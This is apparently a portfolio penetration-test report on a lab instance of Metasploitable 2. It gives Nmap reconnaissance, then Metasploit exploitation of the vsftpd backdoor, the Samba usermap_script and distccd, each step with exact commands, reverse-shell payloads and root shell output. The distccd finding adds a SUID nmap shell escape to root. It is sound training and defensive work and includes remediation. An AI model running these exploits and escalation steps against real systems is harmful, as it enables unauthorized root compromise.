# Red Team Assessment — Metasploitable 2

**Type:** Authorized Penetration Test (personal lab, educational)
**Target:** Metasploitable 2 (Ubuntu 8.04, kernel 2.6.24) — `192.168.56.102`
**Attacker Host:** Kali Linux — `192.168.56.101`
**Environment:** Isolated VirtualBox host-only network, no external systems involved
**Tools used:** Nmap, Metasploit Framework (msfconsole)

> ⚠️ **Scope note:** Metasploitable 2 is an intentionally vulnerable Linux VM published by Rapid7 for security training. All testing below was performed against a locally hosted, isolated instance with no real users or data. No systems outside this lab were tested.

---

## 1. Executive Summary

This assessment targeted Metasploitable 2, a deliberately vulnerable Linux host, from a Kali Linux attacker machine on an isolated host-only network. Testing began with Nmap service enumeration, followed by exploitation using the Metasploit Framework.

**Three vulnerabilities were confirmed and validated through manual exploitation:**

| ID | Finding | Severity | CVSS |
|----|---------|----------|------|
| F-01 | vsftpd 2.3.4 backdoor — remote root access | **Critical** | 9.8 |
| F-03 | Samba "username map script" RCE — remote root access | **Critical** | 9.8 (self-assessed) |
| F-02 | DistCC daemon RCE → privilege escalation to root | **Critical** | 9.8 (self-assessed) |

Two of the three findings (F-01, F-03) granted immediate root-level command execution with no authentication, since the corresponding services on this host run as root. The third (F-02) initially returned a low-privilege shell as the `daemon` user; a subsequent privilege escalation step — exploiting a misconfigured SUID binary — was required and successfully demonstrated to obtain root. That escalation step is documented in full, including practical proof (file creation in `/root`) rather than relying on an effective-UID claim alone.

Every exploit was run to completion and confirmed with `whoami`/`id`/`uname -a` output on the target before being recorded as a finding. Full exploitation logs, screenshots, and reconnaissance output are included in this repository.

---

## 2. Methodology

1. **Reconnaissance** — Nmap service/version scanning against the target
2. **Exploitation** — Metasploit modules selected per identified service, run against the target, access level confirmed on each attempt
3. **Privilege escalation (where required)** — manual post-exploitation enumeration to identify a path from a low-privilege shell to root
4. **Reporting** — findings documented with exact commands, raw output, CVSS scoring, and remediation

---

## 3. Reconnaissance

### 3.1 Nmap — Top 1000 Ports

```
nmap --privileged -sV --top-ports 1000 192.168.56.102
```

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  shell       Netkit rshd
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
```

Full output: `recon/nmap-quick.txt`

### 3.2 Nmap — DistCC Port (outside top 1000)

```
nmap --privileged -sV -p 3632 192.168.56.102
```

```
PORT     STATE SERVICE VERSION
3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

Full output: `recon/nmap-distccd.txt`

From this scan, three services were selected for exploitation: vsftpd (21), distccd (3632), and Samba (139/445), on the basis that each has a well-documented, reliably reproducible Metasploit module.

---

## 4. Confirmed Findings

### 🔴 F-01 — vsftpd 2.3.4 Backdoor → Remote Root Access

| | |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1** | 9.8 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (NVD-published) |
| **CVE** | CVE-2011-2523 |
| **Service** | FTP — vsftpd 2.3.4 (port 21) |
| **CWE** | CWE-78 |

**Description**
The vsftpd 2.3.4 package distributed from the official source between 30 June and 3 July 2011 was compromised with a malicious backdoor. Submitting a username containing `:)` to the FTP service opens a root shell on port 6200, with no authentication required.

**Proof of Concept**
```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.56.101
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

```
[+] 192.168.56.102:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102:47843)

meterpreter > shell
whoami
root
id
uid=0(root) gid=0(root)
```

**Impact**
An unauthenticated, remote attacker obtains an immediate, fully-privileged root shell with a single exploit attempt. No intermediate access level exists for this vulnerability.

**Evidence:** `evidence/vsftpd-backdoor-root.png`

**Remediation**
- Remove the compromised package and reinstall from a verified source
- Upgrade to a current, maintained vsftpd release
- Monitor publicly-reachable service binaries for unexpected tampering

---

### 🔴 F-02 — DistCC Daemon Remote Command Execution → Privilege Escalation to Root

| | |
|---|---|
| **Severity** | Critical |
| **CVSS** | NVD v2.0: 9.3 (`AV:N/AC:M/Au:N/C:C/I:C/A:C`) — no NVD v3.x score published. Self-assessed v3.1: 9.8 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CVE** | CVE-2004-2687 |
| **Service** | distccd v1 (port 3632) |
| **CWE** | CWE-306 |

**Description**
distccd executes compilation jobs it receives with no authentication. A crafted job can instead execute an arbitrary command. The resulting shell runs as the low-privilege `daemon` user, not root — this finding covers both the initial foothold and the escalation to root that followed.

**Part 1 — Initial access as `daemon`**
```
msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 192.168.56.102
msf6 exploit(unix/misc/distcc_exec) > set LHOST 192.168.56.101
msf6 exploit(unix/misc/distcc_exec) > set PAYLOAD cmd/unix/reverse_perl
msf6 exploit(unix/misc/distcc_exec) > exploit
```

```
[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:51534)

whoami
daemon
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

The module's default payload (`cmd/unix/reverse_bash`) failed on this target — `bash: /dev/tcp/...: No such file or directory` — because this bash build lacks the `/dev/tcp` feature it depends on. Switching to `cmd/unix/reverse_perl` succeeded.

**Part 2 — Privilege escalation to root**
Enumerating SUID binaries on the target revealed `/usr/bin/nmap` with the SUID bit set, meaning it runs with the file owner's (root's) privileges regardless of who invokes it. Older Nmap builds include an interactive mode that can spawn a shell — since Nmap itself runs as root here, that spawned shell inherits root too.

```
find / -perm -4000 -type f 2>/dev/null
...
/usr/bin/nmap
...

nmap --interactive
nmap> !sh
whoami
root
id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
```

Practical proof of root-level access, beyond the effective-UID claim:
```
touch /root/pentest-root-proof
ls -l /root/pentest-root-proof
-rw-r--r-- 1 root daemon 0 Oct  2 20:43 /root/pentest-root-proof
```

**Attack Chain**
```
DistCC Daemon Command Execution (unauthenticated)
   → Shell as low-privilege user 'daemon'
      → SUID nmap binary discovered
         → Interactive-mode shell escape (!sh)
            → Root access (euid=0), confirmed via file write to /root
```

**Impact**
An unauthenticated, remote attacker gains command execution as a low-privilege user, then escalates to full root through a misconfigured SUID binary, resulting in complete system compromise.

**Evidence:**
- `evidence/distccd-exploit-setup.png`
- `evidence/distccd-daemon-shell.png`
- `evidence/nmap-suid-privilege-escalation.png`

**Remediation**
- Restrict distccd to trusted build networks only; it has no authentication by design
- Remove the SUID bit from `/usr/bin/nmap` (`chmod u-s /usr/bin/nmap`)
- Periodically audit the filesystem for unexpected SUID/SGID binaries
- Apply least-privilege principles to all installed packages

---

### 🔴 F-03 — Samba "username map script" Remote Command Execution → Root Access

| | |
|---|---|
| **Severity** | Critical |
| **CVSS** | No NVD score published for this CVE. Self-assessed v3.1: 9.8 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CVE** | CVE-2007-2447 |
| **Service** | Samba smbd 3.X (ports 139/445) |
| **CWE** | CWE-78 |

**Description**
Older Samba versions support a `username map script` option, used to map login names through an external script. Its input is not sanitized, so a username containing shell metacharacters results in arbitrary command execution.

**Proof of Concept**
```
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.102
msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.56.101
msf6 exploit(multi/samba/usermap_script) > run
```

```
[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:35411)

whoami
root
id
uid=0(root) gid=0(root)
```

No privilege escalation was required — the Samba service on this host runs as root, so command execution through this vulnerability is immediate, full root access.

**Impact**
An unauthenticated, remote attacker executes arbitrary commands as root with a single exploit attempt, resulting in complete and immediate system compromise.

**Evidence:** `evidence/samba-usermap-root.png`

**Remediation**
- Upgrade Samba beyond version 3.0.25rc3, where this issue is fixed
- Avoid running network-facing services as root; use dedicated, restricted service accounts
- Remove or disable `username map script` unless required, and sanitize its input if it is

---

## 5. Risk Summary

| Severity | Count | Findings |
|----------|-------|----------|
| Critical | 3 | F-01, F-02, F-03 |

**Overall risk rating: Critical.** All three findings result in full root-level compromise of the target, two of them (F-01, F-03) with a single, unauthenticated exploit attempt and no intermediate step. The third (F-02) demonstrates that even a lower-privilege initial foothold on this host leads to root within minutes, due to a misconfigured SUID binary. No authentication, user interaction, or prior access was required for any of the three.

---

## 6. Remediation Priorities

| Priority | Action | Addresses |
|----------|--------|-----------|
| 1 (Immediate) | Replace the compromised vsftpd package | F-01 |
| 1 (Immediate) | Upgrade Samba past 3.0.25rc3 | F-03 |
| 2 (High) | Restrict or disable distccd outside trusted build networks | F-02 |
| 2 (High) | Remove SUID bit from `/usr/bin/nmap` | F-02 |
| 3 (Ongoing) | Routine SUID/SGID binary audits across the host | F-02 |

---

## 7. Repository Structure

```
.
├── README.md                  → this report
├── recon/
│   ├── nmap-quick.txt
│   └── nmap-distccd.txt
├── findings/
│   ├── F-01-vsftpd-backdoor/finding.md
│   ├── F-02-distccd-privesc/finding.md
│   └── F-03-samba-usermap/finding.md
├── evidence/
│   ├── vsftpd-backdoor-root.png
│   ├── distccd-exploit-setup.png
│   ├── distccd-daemon-shell.png
│   ├── nmap-suid-privilege-escalation.png
│   └── samba-usermap-root.png
└── exploits/
    ├── vsftpd-session.log
    ├── distccd-session.log
    └── samba-session.log
```

---

## 8. Disclaimer

This assessment was conducted against a locally hosted, isolated instance of Metasploitable 2 — a virtual machine intentionally built with known vulnerabilities for security training purposes. No production systems, third-party infrastructure, or real user data were involved at any point. This report is published for educational and portfolio purposes only.
